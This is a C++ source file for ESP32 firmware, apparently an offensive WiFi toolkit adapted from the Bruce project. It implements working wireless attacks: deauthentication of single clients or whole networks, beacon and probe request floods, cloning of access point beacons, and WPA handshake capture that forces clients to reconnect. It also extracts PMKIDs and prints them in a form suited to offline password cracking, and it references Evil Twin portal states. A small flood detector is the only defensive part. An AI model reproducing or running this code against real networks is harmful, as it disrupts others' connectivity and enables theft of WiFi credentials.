/**
 * @file BruceWiFi.cpp
 * @brief Lean WiFi attack adapter - extracted essentials from Bruce
 *
 * Contains only the raw frame logic needed for attacks.
 * No menu code, no UI code, no bloat.
 */

#include "BruceWiFi.h"
#include "../core/VanguardEngine.h"
#include "../core/SDManager.h"
#include "../core/PCAPWriter.h"
#include <WiFi.h>
#include <esp_err.h>
#include "../core/RadioWarden.h"

namespace Vanguard {

// Static instance for promiscuous callback
BruceWiFi* BruceWiFi::s_instance = nullptr;

// =============================================================================
// FRAME TEMPLATES (from Bruce wifi_atks.h)
// =============================================================================

// Deauth frame: 26 bytes
// [0-1]   Frame control (0xC0 0x00 = deauth)
// [2-3]   Duration
// [4-9]   Destination MAC (target client or broadcast)
// [10-15] Source MAC (AP BSSID)
// [16-21] BSSID
// [22-23] Sequence
// [24-25] Reason code (0x02 = Previous auth no longer valid)
static const uint8_t DEAUTH_FRAME_TEMPLATE[] = {
    0xC0, 0x00,                         // Frame control: Deauth
    0x3A, 0x01,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
    0xF0, 0xFF,                         // Sequence
    0x02, 0x00                          // Reason: Auth no longer valid
};
constexpr size_t DEAUTH_FRAME_LEN = sizeof(DEAUTH_FRAME_TEMPLATE);

// Beacon frame: 109 bytes (simplified)
static const uint8_t BEACON_FRAME_TEMPLATE[] = {
    0x80, 0x00,                         // Frame control: Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
    0x00, 0x00,                         // Sequence
    // Timestamp (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Beacon interval
    0x64, 0x00,
    // Capability info
    0x31, 0x04,
    // SSID element (tag 0, length, then SSID bytes)
    0x00, 0x20,  // Tag: SSID, Length: 32 (max)
    // 32 bytes for SSID (padded with spaces)
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    // Supported rates
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    // DS Parameter Set (channel)
    0x03, 0x01, 0x01,  // Channel: To be filled at byte 82
    // TIM
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
};
constexpr size_t BEACON_FRAME_LEN = sizeof(BEACON_FRAME_TEMPLATE);
constexpr size_t BEACON_SSID_OFFSET = 38;
constexpr size_t BEACON_SSID_LEN_OFFSET = 37;
constexpr size_t BEACON_CHANNEL_OFFSET = 82;
constexpr size_t BEACON_SRC_OFFSET = 10;
constexpr size_t BEACON_BSSID_OFFSET = 16;

// =============================================================================
// SINGLETON
// =============================================================================

BruceWiFi& BruceWiFi::getInstance() {
    static BruceWiFi instance;
    return instance;
}

BruceWiFi::BruceWiFi()
    : m_initialized(false)
    , m_state(WiFiAdapterState::IDLE)
    , m_currentChannel(1)
    , m_promiscuousEnabled(false)
    , m_packetsSent(0)
    , m_sendFailures(0)
    , m_lastPacketMs(0)
    , m_handshakeCaptured(false)
    , m_onScanComplete(nullptr)
    , m_onAttackProgress(nullptr)
    , m_onHandshakeCaptured(nullptr)
    , m_onPacketReceived(nullptr)
    , m_onAssociation(nullptr)
    , m_onWidsAlert(nullptr)
    , m_deauthCount(0)
    , m_eapolCount(0)
    , m_lastWidsCheckMs(0)
    , m_beaconSsidCount(0)
    , m_beaconCurrentIndex(0)
    , m_beaconChannel(1)
    , m_evilTwinChannel(1)
    , m_evilTwinDeauth(false)
    , m_pcapWriter(nullptr)
{
    memset(m_attackTargetMac, 0, 6);
    memset(m_attackApMac, 0, 6);
    memset(m_evilTwinSSID, 0, sizeof(m_evilTwinSSID));
    memset(m_beaconSsidStorage, 0, sizeof(m_beaconSsidStorage));
    s_instance = this;
}

BruceWiFi::~BruceWiFi() {
    shutdown();
    s_instance = nullptr;
}

// =============================================================================
// LIFECYCLE
// =============================================================================

bool BruceWiFi::onEnable() {
    if (m_enabled) return true;
    
    if (RadioWarden::getInstance().requestRadio(RadioOwner::OWNER_WIFI_STA)) {
        m_enabled = true;
        m_initialized = true;
        m_state = WiFiAdapterState::IDLE;
        return true;
    }
    return false;
}

void BruceWiFi::onDisable() {
    if (!m_enabled) return;

    stopHardwareActivities();
    setPromiscuous(false);
    m_enabled = false;
    m_initialized = false;
    m_state = WiFiAdapterState::IDLE;
    // Release radio so other protocols (BLE) can acquire it cleanly
    RadioWarden::getInstance().releaseRadio();
}

bool BruceWiFi::init() {
    // Legacy init now delegates to Warden via onEnable
    return onEnable();
}

void BruceWiFi::shutdown() {
    // Legacy shutdown now delegates to onDisable
    onDisable();
}

void BruceWiFi::onTick() {
    // WIDS Background Check (every 1 second)
    // Only check if promiscuous mode is active and we are not attacking (to avoid self-trigger)
    if (m_promiscuousEnabled && m_state != WiFiAdapterState::DEAUTHING && m_state != WiFiAdapterState::BEACON_FLOODING) {
        uint32_t now = millis();
        if (now - m_lastWidsCheckMs >= 1000) {
            // Check thresholds
            // > 10 deauths/sec = Flood
            if (m_deauthCount > 10) {
                if (m_onWidsAlert) m_onWidsAlert(WidsEventType::DEAUTH_FLOOD, m_deauthCount);
            }
            // > 20 EAPOLs/sec = Flood possibly
            if (m_eapolCount > 20) {
                if (m_onWidsAlert) m_onWidsAlert(WidsEventType::EAPOL_FLOOD, m_eapolCount);
            }
            // Reset counters for next second
            m_deauthCount = 0;
            m_eapolCount = 0;
            m_lastWidsCheckMs = now;
        }
    }

    switch (m_state) {
        case WiFiAdapterState::SCANNING:
            tickScan();
            break;
        case WiFiAdapterState::DEAUTHING:
            tickDeauth();
            break;
        case WiFiAdapterState::BEACON_FLOODING:
            tickBeaconFlood();
            break;
        case WiFiAdapterState::CAPTURING_HANDSHAKE:
            tickHandshakeCapture();
            break;
        case WiFiAdapterState::MONITORING:
            tickMonitor();
            break;
        case WiFiAdapterState::PROBE_FLOODING:
            tickProbeFlood();
            break;
        case WiFiAdapterState::EVIL_TWIN_ACTIVE:
            // Evil Portal ticks itself via SystemTask
            break;
        case WiFiAdapterState::ERROR:
            // Log and attempt recovery
            if (Serial) Serial.println("[WiFi] Error state, resetting to IDLE");
            m_state = WiFiAdapterState::IDLE;
            break;
        default:
            break;
    }
}

void BruceWiFi::tick() {
    // Legacy tick delegates to onTick
    if (m_enabled) onTick();
}

WiFiAdapterState BruceWiFi::getState() const {
    return m_state;
}

// =============================================================================
// SCANNING (Async)
// =============================================================================

void BruceWiFi::beginScan() {
    if (!m_enabled && !onEnable()) return;

    if (m_state != WiFiAdapterState::IDLE) {
        stopHardwareActivities();
    }

    // Active scan: sends probe requests, forces APs to respond
    // 300ms dwell time per channel (~4.2s total for 14 channels)
    WiFi.scanNetworks(true, true, false, 300);
    m_state = WiFiAdapterState::SCANNING;
}

void BruceWiFi::stopScan() {
    WiFi.scanDelete();
    m_state = WiFiAdapterState::IDLE;
}

bool BruceWiFi::isScanComplete() const {
    return WiFi.scanComplete() >= 0;
}

int BruceWiFi::getScanResultCount() const {
    int result = WiFi.scanComplete();
    return (result >= 0) ? result : 0;
}

bool BruceWiFi::getScanResult(int index, ScanResultEntry& result) const {
    int count = WiFi.scanComplete();
    if (count < 0 || index >= count) {
        return false;
    }

    // Copy BSSID
    uint8_t* bssid = WiFi.BSSID(index);
    if (bssid) {
        memcpy(result.bssid, bssid, 6);
    }

    // Copy SSID
    String ssid = WiFi.SSID(index);
    strncpy(result.ssid, ssid.c_str(), 32);
    result.ssid[32] = '\0';

    result.rssi = WiFi.RSSI(index);
    result.channel = WiFi.channel(index);
    result.encryptionType = WiFi.encryptionType(index);

    return true;
}

void BruceWiFi::onScanComplete(ScanCompleteCallback cb) {
    m_onScanComplete = cb;
}

void BruceWiFi::tickScan() {
    int result = WiFi.scanComplete();
    if (result >= 0) {
        m_state = WiFiAdapterState::IDLE;
        if (m_onScanComplete) {
            m_onScanComplete(result);
        }
    }
}

// =============================================================================
// DEAUTHENTICATION
// =============================================================================

bool BruceWiFi::deauthStation(const uint8_t* stationMac,
                               const uint8_t* apMac,
                               uint8_t channel) {
    if (!m_initialized) return false;

    stopHardwareActivities();
    esp_wifi_start();  // Ensure WiFi STA mode is active
    setChannel(channel);

    memcpy(m_attackTargetMac, stationMac, 6);
    memcpy(m_attackApMac, apMac, 6);
    m_packetsSent = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::DEAUTHING;

    return true;
}

bool BruceWiFi::deauthAll(const uint8_t* apMac, uint8_t channel) {
    // Broadcast deauth - target FF:FF:FF:FF:FF:FF
    static const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return deauthStation(broadcast, apMac, channel);
}

void BruceWiFi::tickDeauth() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < DEAUTH_INTERVAL_MS) {
        return;
    }
    m_lastPacketMs = now;

    // Build deauth frame
    uint8_t frame[DEAUTH_FRAME_LEN];
    memcpy(frame, DEAUTH_FRAME_TEMPLATE, DEAUTH_FRAME_LEN);

    // Set destination (client or broadcast)
    memcpy(&frame[4], m_attackTargetMac, 6);
    // Set source (AP BSSID)
    memcpy(&frame[10], m_attackApMac, 6);
    // Set BSSID
    memcpy(&frame[16], m_attackApMac, 6);

    // Send frame 3 times (like Bruce does)
    for (int i = 0; i < 3; i++) {
        if (sendRawFrame(frame, DEAUTH_FRAME_LEN)) {
            m_packetsSent++;
        } else {
            m_sendFailures++;
        }
    }

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// BEACON FLOOD
// =============================================================================

// Beacon flood state is now in class members (m_beaconSsids, etc.)

bool BruceWiFi::beaconFlood(const char** ssids, size_t count, uint8_t channel) {
    if (!m_initialized || count == 0) return false;

    stopHardwareActivities();
    esp_wifi_start();  // Ensure WiFi STA mode is active
    setChannel(channel);

    m_beaconSsidCount = min(count, (size_t)MAX_BEACON_SSIDS);
    for (size_t i = 0; i < m_beaconSsidCount; i++) {
        strncpy(m_beaconSsidStorage[i], ssids[i], 32);
        m_beaconSsidStorage[i][32] = '\0';
    }
    m_beaconCurrentIndex = 0;
    m_beaconChannel = channel;

    m_packetsSent = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::BEACON_FLOODING;

    return true;
}

bool BruceWiFi::cloneBeacon(const char* ssid,
                             const uint8_t* bssid,
                             uint8_t channel) {
    static const char* singleSsid[1];
    singleSsid[0] = ssid;

    // Store BSSID to use (or generate random if null)
    if (bssid) {
        memcpy(m_attackApMac, bssid, 6);
    } else {
        // Random MAC
        for (int i = 0; i < 6; i++) {
            m_attackApMac[i] = random(256);
        }
        m_attackApMac[0] &= 0xFE;  // Unicast
        m_attackApMac[0] |= 0x02;  // Locally administered
    }

    return beaconFlood(singleSsid, 1, channel);
}

void BruceWiFi::tickBeaconFlood() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < BEACON_INTERVAL_MS) {
        return;
    }
    m_lastPacketMs = now;

    if (m_beaconSsidCount == 0) {
        m_state = WiFiAdapterState::IDLE;
        return;
    }

    // Build beacon frame
    uint8_t frame[BEACON_FRAME_LEN];
    memcpy(frame, BEACON_FRAME_TEMPLATE, BEACON_FRAME_LEN);

    // Generate random BSSID for this beacon
    uint8_t bssid[6];
    for (int i = 0; i < 6; i++) {
        bssid[i] = random(256);
    }
    bssid[0] &= 0xFE;  // Unicast
    bssid[0] |= 0x02;  // Locally administered

    // Set source and BSSID
    memcpy(&frame[BEACON_SRC_OFFSET], bssid, 6);
    memcpy(&frame[BEACON_BSSID_OFFSET], bssid, 6);

    // Set SSID
    const char* ssid = m_beaconSsidStorage[m_beaconCurrentIndex];
    size_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    frame[BEACON_SSID_LEN_OFFSET] = ssidLen;
    memset(&frame[BEACON_SSID_OFFSET], 0, 32);
    memcpy(&frame[BEACON_SSID_OFFSET], ssid, ssidLen);

    // Set channel
    frame[BEACON_CHANNEL_OFFSET] = m_beaconChannel;

    // Send beacon
    if (sendRawFrame(frame, BEACON_FRAME_LEN)) {
        m_packetsSent++;
    } else {
        m_sendFailures++;
    }

    // Rotate to next SSID
    m_beaconCurrentIndex = (m_beaconCurrentIndex + 1) % m_beaconSsidCount;

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// HANDSHAKE CAPTURE (Stub - needs promiscuous mode)
// =============================================================================

bool BruceWiFi::captureHandshake(const uint8_t* apMac,
                                  uint8_t channel,
                                  bool sendDeauth) {
    if (!m_initialized) return false;

    stopHardwareActivities();
    setChannel(channel);
    setPromiscuous(true);

    memcpy(m_attackApMac, apMac, 6);
    m_handshakeCaptured = false;
    m_state = WiFiAdapterState::CAPTURING_HANDSHAKE;

    // Optionally send deauth to force reconnect
    if (sendDeauth) {
        static const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(m_attackTargetMac, broadcast, 6);
    }

    return true;
}

bool BruceWiFi::hasHandshake() const {
    return m_handshakeCaptured;
}

bool BruceWiFi::saveHandshake(const char* filename) {
    // If we have a PCAP writer with captured data, flush and return success
    if (m_pcapWriter && m_handshakeCaptured) {
        m_pcapWriter->flush();
        if (Serial) Serial.printf("[WiFi] Handshake saved to PCAP\n");
        return true;
    }
    return false;
}

void BruceWiFi::onHandshakeCaptured(HandshakeCapturedCallback cb) {
    m_onHandshakeCaptured = cb;
}

void BruceWiFi::tickHandshakeCapture() {
    // Send periodic deauth to force reconnection
    uint32_t now = millis();
    if (now - m_lastPacketMs >= 500) {  // Every 500ms
        m_lastPacketMs = now;

        uint8_t frame[DEAUTH_FRAME_LEN];
        memcpy(frame, DEAUTH_FRAME_TEMPLATE, DEAUTH_FRAME_LEN);
        memcpy(&frame[4], m_attackTargetMac, 6);
        memcpy(&frame[10], m_attackApMac, 6);
        memcpy(&frame[16], m_attackApMac, 6);

        if (sendRawFrame(frame, DEAUTH_FRAME_LEN)) {
            m_packetsSent++;
        } else {
            m_sendFailures++;
        }
    }

    // Handshake detection happens in promiscuous callback
}

// Evil Twin is handled by EvilPortal class (see SystemTask::handleActionStart).
// startEvilTwin()/stopEvilTwin() removed as dead code.

// =============================================================================
// PASSIVE MONITORING
// =============================================================================

bool BruceWiFi::startMonitor(uint8_t channel) {
    if (!m_initialized) return false;

    stopHardwareActivities();
    if (channel > 0) {
        setChannel(channel);
    }
    setPromiscuous(true);

    m_state = WiFiAdapterState::MONITORING;
    return true;
}

void BruceWiFi::stopMonitor() {
    if (m_state == WiFiAdapterState::MONITORING) {
        setPromiscuous(false);
        m_state = WiFiAdapterState::IDLE;
    }
}

void BruceWiFi::onPacketReceived(PacketCallback cb) {
    m_onPacketReceived = cb;
}

void BruceWiFi::tickMonitor() {
    // Packet handling happens in promiscuous callback
}

// =============================================================================
// PROBE FLOOD
// =============================================================================

bool BruceWiFi::startProbeFlood(uint8_t channel) {
    if (!m_initialized) return false;

    stopHardwareActivities();

    // Ensure WiFi STA mode is active (may have been stopped after recon)
    esp_wifi_start();

    setChannel(channel);

    m_packetsSent = 0;
    m_sendFailures = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::PROBE_FLOODING;

    if (Serial) Serial.printf("[WiFi] Probe flood started on ch%d\n", channel);
    return true;
}

void BruceWiFi::stopProbeFlood() {
    if (m_state == WiFiAdapterState::PROBE_FLOODING) {
        m_state = WiFiAdapterState::IDLE;
        if (Serial) Serial.println("[WiFi] Probe flood stopped");
    }
}

void BruceWiFi::tickProbeFlood() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < DEAUTH_INTERVAL_MS) return;
    m_lastPacketMs = now;

    // Build probe request frame (subtype 0x40)
    uint8_t frame[64];
    memset(frame, 0, sizeof(frame));

    // Frame control: Probe Request (0x40 0x00)
    frame[0] = 0x40;
    frame[1] = 0x00;
    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;
    // DA: Broadcast
    memset(&frame[4], 0xFF, 6);
    // SA: Random MAC (rotate each frame)
    for (int i = 0; i < 6; i++) frame[10 + i] = random(256);
    frame[10] &= 0xFE; // Unicast
    frame[10] |= 0x02; // Locally administered
    // BSSID: Broadcast
    memset(&frame[16], 0xFF, 6);
    // Sequence number
    frame[22] = random(256);
    frame[23] = random(256);
    // SSID IE: Random SSID
    frame[24] = 0x00; // Tag: SSID
    uint8_t ssidLen = 8 + random(8); // 8-15 chars
    frame[25] = ssidLen;
    for (int i = 0; i < ssidLen; i++) {
        frame[26 + i] = 'a' + random(26);
    }
    // Supported Rates IE
    int ratesOffset = 26 + ssidLen;
    frame[ratesOffset] = 0x01; // Tag: Supported Rates
    frame[ratesOffset + 1] = 0x04;
    frame[ratesOffset + 2] = 0x82;
    frame[ratesOffset + 3] = 0x84;
    frame[ratesOffset + 4] = 0x8B;
    frame[ratesOffset + 5] = 0x96;

    int frameLen = ratesOffset + 6;
    if (sendRawFrame(frame, frameLen)) {
        m_packetsSent++;
    } else {
        m_sendFailures++;
        if (Serial && m_sendFailures % 100 == 1) {
            Serial.printf("[WiFi] sendRawFrame FAILED (total failures: %u)\n", m_sendFailures);
        }
    }

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// ATTACK CONTROL
// =============================================================================

void BruceWiFi::stopHardwareActivities() {
    // Stop Evil Twin if running (EvilPortal handles its own cleanup)
    if (m_state == WiFiAdapterState::EVIL_TWIN_ACTIVE) {
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        delay(100);
        WiFi.mode(WIFI_STA);
        m_state = WiFiAdapterState::IDLE;
    }

    if (m_state == WiFiAdapterState::PROBE_FLOODING) {
        stopProbeFlood();
    }

    setPromiscuous(false);
    setPcapLogging(false); // Ensure PCAP closed
    m_state = WiFiAdapterState::IDLE;
    m_packetsSent = 0;
    m_sendFailures = 0;
    m_eapolCount = 0;
}

uint32_t BruceWiFi::getPacketsSent() const {
    return m_packetsSent;
}

void BruceWiFi::onAttackProgress(AttackProgressCallback cb) {
    m_onAttackProgress = cb;
}

void BruceWiFi::onWidsAlert(WidsCallback cb) {
    m_onWidsAlert = cb;
}

// =============================================================================
// LOW-LEVEL
// =============================================================================

bool BruceWiFi::sendRawFrame(const uint8_t* frame, size_t len) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    return (result == ESP_OK);
}

bool BruceWiFi::setChannel(uint8_t channel) {
    if (channel < 1 || channel > 14) return false;

    esp_err_t result = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (result == ESP_OK) {
        m_currentChannel = channel;
        return true;
    }
    return false;
}

bool BruceWiFi::setPromiscuous(bool enable) {
    esp_err_t result;

    if (enable && !m_promiscuousEnabled) {
        esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
        result = esp_wifi_set_promiscuous(true);
        m_promiscuousEnabled = (result == ESP_OK);
    } else if (!enable && m_promiscuousEnabled) {
        result = esp_wifi_set_promiscuous(false);
        m_promiscuousEnabled = false;
    }

    return m_promiscuousEnabled == enable;
}

// =============================================================================
// PROMISCUOUS CALLBACK
// =============================================================================

void BruceWiFi::setPcapLogging(bool enabled, const char* filename) {
    if (m_pcapWriter) {
        m_pcapWriter->close();
        delete m_pcapWriter;
        m_pcapWriter = nullptr;
    }

    if (enabled && filename) {
        m_pcapWriter = new PCAPWriter(filename);
        if (!m_pcapWriter->open()) {
            if (Serial) Serial.println("[WiFi] PCAP open failed!");
            delete m_pcapWriter;
            m_pcapWriter = nullptr;
        } else {
            if (Serial) Serial.printf("[WiFi] Logging to %s\n", filename);
        }
    }
}

void BruceWiFi::onAssociation(AssociationCallback cb) {
    m_onAssociation = cb;
}

void BruceWiFi::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_instance) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;

    // Minimum 802.11 frame header size (FC + Duration + 3x Addr = 24 bytes)
    if (len < 24) return;

    // [PHASE 3.3] PCAP Logging
    if (s_instance->m_pcapWriter) {
        s_instance->m_pcapWriter->writePacket(payload, len);
    }

    // Forward to packet callback if registered
    if (s_instance->m_onPacketReceived) {
        s_instance->m_onPacketReceived(payload, len, rssi);
    }

    // [PHASE 2.2] WIDS Detection
    // Check for Deauth frames (Mgmt type, subtype 0xC = Deauth, 0xA = Disassoc)
    if (type == WIFI_PKT_MGMT) {
        // Frame Control is first 2 bytes. 
        // 0xC0 = Deauth, 0xA0 = Disassoc (assuming little endian payload[0])
        // Mask 0xFC to check type/subtype
        uint8_t subtype = payload[0];
        if (subtype == 0xC0 || subtype == 0xA0) {
            s_instance->m_deauthCount++;
        }

        // Probe Request Detection (subtype 0x40)
        if (subtype == 0x40 && len >= 24) {
            // Addr2 = Source MAC (the station sending the probe)
            const uint8_t* srcMac = &payload[10];
            // Check for non-broadcast source
            if (!(srcMac[0] & 0x01)) {
                // Extract probed SSID from the Tagged Parameters
                // SSID IE starts at offset 24 (after fixed frame fields)
                if (len > 26 && payload[24] == 0x00) { // Tag 0 = SSID
                    (void)payload[25]; // SSID length available for future use
                }
                // Forward as association event for TargetTable tracking
                // Use the probing station as "client" with broadcast as "AP"
                if (s_instance->m_onAssociation) {
                    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    s_instance->m_onAssociation(srcMac, broadcast);
                }
            }
        }
    }

    // [PHASE 3.1] Client Discovery Implementation
    // We only care about Data frames for client discovery
    if (type == WIFI_PKT_DATA) {
        if (len < sizeof(wifi_data_frame_header_t)) return;
        wifi_data_frame_header_t* header = (wifi_data_frame_header_t*)payload;
        
        // Extract Frame Control bits
        uint16_t fc = header->frame_control;
        bool toDs = (fc & 0x0100) != 0;
        bool fromDs = (fc & 0x0200) != 0;

        // In 802.11 Data Frames:
        // ToDS=0, FromDS=0: Addr1=Dst, Addr2=Src (Client), Addr3=BSSID (AP)
        // ToDS=1, FromDS=0: Addr1=BSSID (AP), Addr2=Src (Client), Addr3=Dst
        // ToDS=0, FromDS=1: Addr1=Dst, Addr2=BSSID (AP), Addr3=Src (Client)
        // ToDS=1, FromDS=1: WDS (Ignore)

        const uint8_t* clientMac = nullptr;
        const uint8_t* apMac = nullptr;

        if (!toDs && !fromDs) {
            clientMac = header->addr2;
            apMac = header->addr3;
        } else if (toDs && !fromDs) {
            clientMac = header->addr2;
            apMac = header->addr1;
        } else if (!toDs && fromDs) {
            clientMac = header->addr3;
            apMac = header->addr2;
        }

        // If we found a valid mapping, send to association callback
        if (clientMac && apMac && s_instance->m_onAssociation) {
            // Check if client is not broadcast/multicast
            if (!(clientMac[0] & 0x01)) {
                if (Serial) Serial.printf("[WiFi] Association: %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X\n",
                    clientMac[0], clientMac[1], clientMac[2], clientMac[3], clientMac[4], clientMac[5],
                    apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5]);
                s_instance->m_onAssociation(clientMac, apMac);
            }
        }
    }

    // [PHASE 3.3] Handshake Capture
    // EAPOL Detection
    if (type == WIFI_PKT_DATA) {
        // EtherType for EAPOL is 0x888e
        // In 802.11 Data frames, the payload starts after the header
        // For QoS Data, header is 26 bytes. For Data, header is 24 bytes.
        // But wifi_data_frame_header_t handles basic fields.
        // SNAP header (8 bytes) usually precedes the EAPOL payload.
        // Index 24-25 is often the length/type in some captures, but 
        // 802.11 stack usually gives us the 802.2 LLC/SNAP header.
        
        // Simpler check: EAPOL frames are small and have a specific structure.
        // We look for 0x88 0x8e in the payload.
        if (len < 2) return;  // Guard against unsigned underflow on (len - 1)
        for (int i = 0; i < len - 1; i++) {
            if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
                // Found EAPOL frame
                s_instance->m_eapolCount++;
                s_instance->m_handshakeCaptured = true;

                // PMKID Detection: RSN IE (tag 0x30) in EAPOL Message 1
                // PMKID is the last 16 bytes in the RSN IE of key message 1
                // Key Info field at offset +5 from EAPOL start, bit 3 = pairwise
                int eapolStart = i + 2; // Skip ethertype
                if (eapolStart + 99 < len) {
                    // Scan for RSN IE tag (0x30) within the EAPOL payload
                    for (int j = eapolStart + 20; j < len - 18; j++) {
                        if (payload[j] == 0x30) { // RSN IE tag
                            uint8_t rsnLen = payload[j + 1];
                            // PMKID list is at the end of RSN IE
                            // If RSN IE contains a PMKID, the last 2+16 bytes are count(2) + PMKID(16)
                            if (rsnLen >= 20 && j + 2 + rsnLen <= len) {
                                int pmkidOffset = j + 2 + rsnLen - 16;
                                // Log PMKID in hashcat format to serial
                                if (Serial) {
                                    wifi_data_frame_header_t* hdr = (wifi_data_frame_header_t*)payload;
                                    Serial.print("[WiFi] PMKID: ");
                                    for (int k = 0; k < 16; k++) Serial.printf("%02x", payload[pmkidOffset + k]);
                                    Serial.print("*");
                                    for (int k = 0; k < 6; k++) Serial.printf("%02x", hdr->addr2[k]); // AP MAC
                                    Serial.print("*");
                                    for (int k = 0; k < 6; k++) Serial.printf("%02x", hdr->addr1[k]); // STA MAC
                                    Serial.println();
                                }
                            }
                            break;
                        }
                    }
                }

                if (s_instance->m_onHandshakeCaptured) {
                    wifi_data_frame_header_t* header = (wifi_data_frame_header_t*)payload;
                    s_instance->m_onHandshakeCaptured(header->addr3);
                }
                break;
            }
        }
    }
}

} // namespace Vanguard
